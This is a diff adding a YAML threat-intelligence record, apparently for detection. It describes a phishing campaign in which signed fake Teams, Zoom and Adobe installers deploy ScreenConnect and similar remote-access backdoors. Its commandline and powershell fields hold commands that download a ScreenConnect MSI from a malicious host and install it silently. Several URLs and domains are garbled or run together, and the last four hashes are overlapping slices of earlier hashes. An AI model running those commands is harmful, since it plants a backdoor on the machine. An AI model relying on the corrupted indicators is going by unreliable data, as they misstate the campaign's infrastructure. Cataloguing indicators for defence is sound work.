@@ -1,0 +1,133 @@
+description: Phishing emails and malicious downloads disguised as legitimate software
+  installations leading to the deployment of ScreenConnect, Kepavll, and Screwon malware.
+malware_families:
+- ScreenConnect
+- Tactical RMM
+- MeshAgent
+- Kepavll
+- Screwon
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - msteams.exe
+  - trustconnectagent.exe
+  - adobereader.exe
+  - zoomworkspace.clientsetup.exe
+  - invite.exe
+  - msiexec.exe
+  commandline:
+  - Invoke-WebRequest -OutFile C:\\Temp\\ScreenConnect.msi; Start-Process msiexec.exe /i C:\\Temp\\ScreenConnect.msi
+  - ScreenConnect.ClientService.exe
+  - powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://turn.zoomworkforce.us/Bin/ScreenConnect ClientSetup.msi?AccessKey=Guest; OutFile = Join-Path $env:TEMP ScreenConnect ClientSetup.msi"
+  - msiexec -ArgumentList "/i C:\\Users\\AppData\\Local\\Temp\\mysc.msi /quiet /norestart"
+  powershell:
+  - Invoke-WebRequest -OutFile C:\\Temp\\ScreenConnect.msi; Start-Process msiexec.exe /i C:\\Temp\\ScreenConnect.msi
+  - Invoke-WebRequest -Uri https://turn.zoomworkforce.us/Bin/ScreenConnect ClientSetup.msi?AccessKey=Guest; OutFile = Join-Path $env:TEMP ScreenConnect ClientSetup.msi
+  - msiexec -ArgumentList "/i C:\\Users\\AppData\\Local\\Temp\\mysc.msi /quiet /norestart"
+  scripting_engine: []
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKLM\\SYSTEM\\ControlSet001\\Services\\ScreenConnect Client [16digit unique hexadecimal client identifier]
+  image_load: []
+  network_connections:
+  - trustconnectsoftware.com
+  - Pacdashed.com
+  file_activity:
+  - C:\\Program Files\\Adobe Acrobat Reader\\AdobeReader.exe
+  - C:\\Temp\\ScreenConnect.msi
+  - C:\\Program Files (x86)\\ScreenConnect Client [Client ID]
+  - C:\\Program Files\\ScreenConnect
+  - C:\\Users\\AppData\\Local\\Temp\\ScreenConnect ClientSetup.msi
+  persistence:
+  - Registered as a Windows service
+  - Run key in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  - Registry run key for ScreenConnect
+  process_relations: []
+IOCs:
+  hashes:
+  - ef7702ac5f574b2c046df6d5ab3e603abe57d981918cddedf4de6fe41b1d3288
+  - 4c6251e1db72bdd00b64091013acb8b9cb889c768a4ca9b2ead3cc89362ac2ca
+  - 86b788ce9379e02e1127779f6c4d91ee4c1755aae18575e2137fb82ce39e100f
+  - 959509ef2fa29dfeeae688d05d31fff08bde42e2320971f4224537969f553070
+  - 5701dabdba685b903a84de6977a9f946accc08acf2111e5d91bc189a83c3faea
+  - 6641561ed47fdb2540a894eb983bcbc82d7ad8eafb4af1de24711380c9d38f8b
+  - 98a4d09db3de140d251ea6afd30dcf3a08e8ae8e102fc44dd16c4356cc7ad8a6
+  - 9827c2d623d2e3af840b04d5102ca5e4bd01af174131fc00731b0764878f00ca
+  - edde2673becdf84e3b1d823a985c7984fec42cb65c7666e68badce78bd0666c0
+  - c6097dfbdaf256d07ffe05b443f096c6c10d558ed36380baf6ab446e6f5e2bc3
+  - 947bcb782c278da450c2e27ec29cb9119a687fd27485f2d03c3f2e133551102e
+  - 36fdd4693b6df8f2de7b36dff745a3f41324a6dacb78b4159040c5d15e11acb7
+  - 35f03708f590810be88dfb27c53d63cd6bb3fb93c110ca0d01bc23ecdf61f983
+  - af651ebcacd88d292eb2b6cbbe28b1e0afd1d418be862d9e34eacbd65337398c
+  - c862dbcada4472e55f8d1ffc3d5cfee65d1d5e06b59a724e4a93c7099dd37357
+  - 72bdd00b64091013acb8b9cb889c768a4ca9b2ead3cc89362ac2ca86b788ce93
+  - 79e02e1127779f6c4d91ee4c1755aae18575e2137fb82ce39e100f959509ef2f
+  - a29dfeeae688d05d31fff08bde42e2320971f4224537969f5530705701dabdba
+  - 685b903a84de6977a9f946accc08acf2111e5d91bc189a83c3faea6641561ed4
+  ip_addresses:
+  - 136.0.157.51
+  - 154.16.171.203
+  - 173.195.100.77
+  - 66.150.196.166
+  - 136.0.157.5
+  domains:
+  - trustconnectsoftware.com
+  - Pacdashed.com
+  - turn.zoomworkforce.us
+  - rightrecoveryscreen.top
+  - smallmartdirectintense.com
+  - r9.virtualonlineserver.org
+  - app.ovbxbzuaiopp.onlineserver.denako-cin.ccc
+  - cold-na-phx-7.gofile.io
+  - absolutedarkorderhqx.com
+  - app.amazonwindowsprime.com
+  - pub-a6b1edca753b4d618d8b2f09eaa9e2af.r2.dev
+  - cold-na-phx-8.gofile.io
+  - server.yakabanski
+  - screen.top
+  - server.nathanjhooskreen.top
+  - read.pibanerllc.de
+  - app.ovbxbzuaiopp.onlineserver.denako-cin.cccold-na-phx-7.gofile.io
+  - kreen.top
+  - pacdashed.com
+  - app.onlineserver.denako-cin.cccold-na-phx-7.gofile.io
+  urls:
+  - hxxps://store-na-phx-1.gofile.io/download/direct/fc087401-6097-412d-8c7f-e471c7d83d7f/Onchain-installer.exe
+  - hxxps://waynelimck.com/bid/MsTeams.exe
+  - hxxps://pub-575e7adf57f741ba8ce32bfe83a1e7f4.r2.dev/Project%20Proposal%20-%20eDocs.exe
+  - hxxps://adb-pro.design/Adobe/download.php
+  - hxxps://easyguidepdf.com/A/AdobeReader/download.php
+  - hxxps://chata2go.com.mx/store/invite.exe
+  - hxxps://lankystocks.com/Zoom/Windows/download.php
+  - hxxps://sherwoods.ae/dm/Analog/Machine/download.php
+  - hxxpsecured.im/file/MsTeams.exe
+  - hxxps://pixeldrain.com/api/file/CiEwUUGq?download
+  - hxxps://sunride.com.do/clean22/clea/cle/MsTeams.exe
+  - hxxps://eliteautoused-cars.com/bid/MsTeams.exe
+  - hxxps://sherwoods.ae/wp-admin/Apex_Injury_Attorneys/download.php
+  - hxxps://yad.ma/wp-admin/El_Paso_Orthopaedic_Group/download.php
+  - hxxps://pacificlimited.mw/trash/cee/tra/MsTeams.exe
+  - hxxps://yad.ma/Union/Colony/download.php
+  - hxxps://yad.ma/Union/Colony/complete.php
+  - hxxps://www.metrosuitesbellavie.com/crewe/cjo/yte/MsTeams.exe
+  - https://turn.zoomworkforce.us/Bin/ScreenConnect ClientSetup.msi?AccessKey=Guest
+  - https://smallmartdirectintense.com/Bin/ScreenConnect ClientSetup.exe
+  - https://rightrecoveryscreen.top/Bin/ScreenConnect ClientSetup.exs o ACGoss&yGUERSC-
+    A 20masterscmaa-Ec=8cbarbGmEce"
+  - https://r9.virtualonlineserver.org/Bin/ScreenCannect.ClieniSetup.msite=Accassiy=Guest
+  - https://app.ovbxbzuaiopp.onlineserver.denako-cin.cccold-na-phx-7.gofile.io/downloadlisectiae
+    173651-576-40dlb-bo37-23244e670c3/ScreenConnect. ClientSetup.exe
+  - https://cold-na.phx-8.gofile.io/downloadlisectiae 173651-576-40dlb-bo37-23244e670c3/ScreenConnect.
+    ClientSetup.exe
+  - https://server.yakabanski/Bin/ScreenCannect.ClieniSetup.msite=Accassiy=Guest
+  - https://kreen.top/Bid/MsTeams.exe
+  - https://read.pibanerllc.de/trash/cee/tra/MsTeams.exe
+  - https://pacdashed.com/file/MsTeams.exe
+  - https://app.onlineserver.denako-cin.cccold-na-phx-7.gofile.io/downloadlisectiae
+    173651-576-40dlb-bo37-23244e670c3/ScreenConnect. ClientSetup.exe
+authors:
+- Sai Chakri Kandalai
+reference: https://www.microsoft.com/en-us/security/blog/2026/03/03/signed-malware-impersonating-workplace-apps-deploys-rmm-backdoors/
+date_of_publication: March 03, 2026
+file_creation_date: March 04, 2026
